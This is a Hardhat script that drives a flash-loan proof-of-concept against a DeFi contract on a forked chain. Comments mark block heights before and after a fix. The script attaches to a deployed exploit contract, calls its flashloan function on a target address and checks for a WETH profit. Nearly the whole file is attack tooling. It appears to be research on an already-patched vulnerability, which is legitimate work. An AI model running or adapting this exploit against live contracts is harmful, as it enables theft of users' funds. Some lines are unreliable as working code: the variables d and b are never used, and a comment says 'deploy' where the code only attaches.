const hre = require("hardhat");
// blockNumber: 12500000 // after fix  
// blockNumber: 12350000 // before fix
async function main() {
    // We'll use this contract to check the WETH balance of the 
    // PoC contract.
    const WETH = await hre.ethers.getContractAt("IERC20", '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2');
    // Deploy the PoC contract.
    const FlashLoan = await hre.ethers.getContractFactory("FlashLoan");
    const flashloan = FlashLoan.attach('0x09635f643e140090a9a8dcd712ed6285858cebef');
    // Let's run the flashLoan PoC!
    const balance0 = await WETH.balanceOf(flashloan.address);
    console.log("Balance before flashloan", balance0 / 1e18, "ETH");
    console.log("starting flashloan");
    // I had a bit of trouble finding the optimal values using the
    // the Python script, values didn't seem to work.
    // Found these parameters by trial and error.
    let d = "207569000000000000000000"
    let b = "092430000000000000000000"
    await flashloan.flashloan('0x71bE63f3384f5fb98995898A86B02Fb2426c5788');
    const balance1 = await WETH.balanceOf(flashloan.address);
    console.log("If the balance is positive the flashloan worked!");
    console.log("Balance after flashloan", balance1 / 1e18, "ETH");
}
main()
    .then(() => process.exit(0))
    .catch(error => {
        console.error(error);
        process.exit(1);
    });